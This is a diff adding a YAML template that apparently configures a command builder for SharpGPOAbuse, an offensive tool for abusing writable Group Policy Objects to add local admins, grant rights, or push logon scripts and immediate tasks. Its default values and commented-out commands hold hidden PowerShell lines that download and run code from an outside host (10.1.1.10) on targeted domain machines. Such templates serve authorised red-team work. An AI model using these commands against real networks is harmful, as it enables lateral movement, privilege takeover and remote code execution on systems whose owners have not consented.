@@ -1,0 +1,191 @@
+---
+projectLink: https://github.com/FSecureLABS/SharpGPOAbuse
+name: SharpGPOAbuse
+languages:
+  - name: EXE
+    prefix: SharpGPOAbuse.exe
+
+params:
+  - name: AttackType
+    description: The attack type to use
+    default: "--AddComputerScript"
+    template: "{0}"
+    type: select
+    options: ["--AddUserRights", "--AddLocalAdmin", "--AddComputerScript", "--AddUserScript", "--AddComputerTask", "--AddUserTask"]
+    optional: false
+
+  - name: Rights manipulation
+    type: label
+
+  - name: UserRights
+    type: text
+    description: Set the new rights to add to a user. This option is case sensitive and a comma separeted list must be used.
+    template: "--UserRights \"{0}\""
+    default: SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight
+    optional: true
+  - name: UserAccount
+    type: text
+    description: Set the account to add the new rights.
+    template: "--UserAccount {0}"
+    default: bob.smith
+    optional: true
+  - name: GPOName
+    type: text
+    description: The name of the vulnerable GPO.
+    template: "--GPOName \"{0}\""
+    default: Vulnerable GPO
+    optional: true
+  
+  - name: Scripts configuration
+    type: label
+
+  - name: ScriptName
+    type: text
+    description:  Set the name of the new startup script.
+    template: "--ScriptName {0}"
+    default: StartupScript.bat
+    optional: true
+  - name: ScriptContents
+    type: text
+    description: Set the contents of the new startup script.
+    template: "--ScriptContents \"{0}\""
+    default: if %username%==<targetusername> powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"
+    optional: true
+
+  - name: Task configuration
+    type: label
+
+  - name: TaskName
+    type: text
+    description: Set the name of the new computer task.
+    template: "--TaskName \"{0}\""
+    default: Update
+    optional: true
+  - name: Author
+    type: text
+    description: Set the author of the new task (use a DA account).
+    template: "--Author {0}"
+    default: Example\Admin
+    optional: true
+  - name: Command
+    type: text
+    description: Command to execute.
+    template: "--Command \"{0}\""
+    default: cmd.exe
+    optional: true
+  - name: Arguments
+    type: text
+    description: Arguments passed to the command.
+    template: "--Arguments \"{0}\""
+    default: /c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"
+    optional: true
+
+  - name: TargetUsername
+    type: text
+    description: The user to target. The malicious task will run only on the specified user. Should be in the format <DOMAIN>\<USERNAME>
+    template: "--TargetUsername {0}"
+    default: Example\Admin
+    optional: true
+  - name: TargetUserSID
+    type: text
+    description: The targeted user's SID.
+    template: "{0}"
+    default: S-1-24
+    optional: true
+  - name: TargetDnsName
+    type: text
+    description: The DNS name of the computer to target. The malicious task will run only on the specified host.
+    template: "--TargetDnsName {0}"
+    default: target.example.local
+    optional: true
+
+  - name: Domain
+    type: text
+    description: Set the target domain
+    template: "--Domain {0}"
+    default: example.local
+    optional: true
+  - name: DomainController
+    type: text
+    description: Set the target domain controller
+    template: "--DomainController {0}"
+    default: dc1.example.local
+    optional: true
+
+  - name: Flags
+    type: label
+
+  - name: FilterEnabled
+    type: flag
+    description: Enable Target Filtering for computer immediate tasks.
+    value: "--FilterEnabled"
+    optional: true
+    selected: false
+  - name: Force
+    type: flag
+    description: Overwrite existing files if required
+    value: "--Force"
+    optional: true
+    selected: false
+
+sections:
+- name: Self crafted command
+  labels: ["Lateral"]
+  mitre: ''
+  verb: ''
+  required_flags: [AttackType]
+  optional_flags: [UserRights, UserAccount, GPOName, ScriptName, ScriptContents, TaskName, Author, Command, Arguments, FilterEnabled, TargetUsername, TargetUserSID, TargetDnsName]
+
+- name: Adding User Rights
+  labels: ["Lateral", "Creds"]
+  mitre: ''
+  verb: '--AddUserRights'
+  required_flags: [UserRights, UserAccount, GPOName]
+  optional_flags: []
+
+- name: Adding a Local Admin
+  labels: ["Lateral", "Creds"]
+  mitre: ''
+  verb: '--AddLocalAdmin'
+  required_flags: [UserAccount, GPOName]
+  optional_flags: []
+
+- name: Configuring a User or Computer Logon Script
+  labels: ["Lateral", "Creds"]
+  mitre: ''
+  verb: '--AddUserScript'
+  required_flags: [ScriptName, ScriptContents, GPOName]
+  optional_flags: []
+
+- name: Configuring a Computer or User Immediate Task
+  labels: ["Lateral", "Creds"]
+  mitre: ''
+  verb: '--AddComputerTask'
+  required_flags: [TaskName, Author, Command, Arguments, GPOName, FilterEnabled, TargetDnsName]
+  optional_flags: []
+
+
+  
+  # - name: Configuring a User or Computer Logon Script
+    
+  #   commands:
+  #     - language: EXE
+  #       command: SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "{{GPOName}}"
+
+  # - name: Configuring a User or Computer Logon Script, specific user or computer
+  #   labels: ["Lateral", "Creds"]
+  #   commands:
+  #     - language: EXE
+  #       command: SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "" --GPOName "{{GPOName}}"
+
+  # - name: Configuring a Computer or User Immediate Task
+  #   labels: ["Lateral", "Creds"]
+  #   commands:
+  #     - language: EXE
+  #       command: SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "{{GPOName}}"
+
+  # - name: Configuring a Computer or User Immediate Task, specific user or computer
+  #   labels: ["Lateral", "Creds"]
+  #   commands:
+  #     - language: EXE
+  #       command: SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO" --FilterEnabled --TargetDnsName target.domain.com
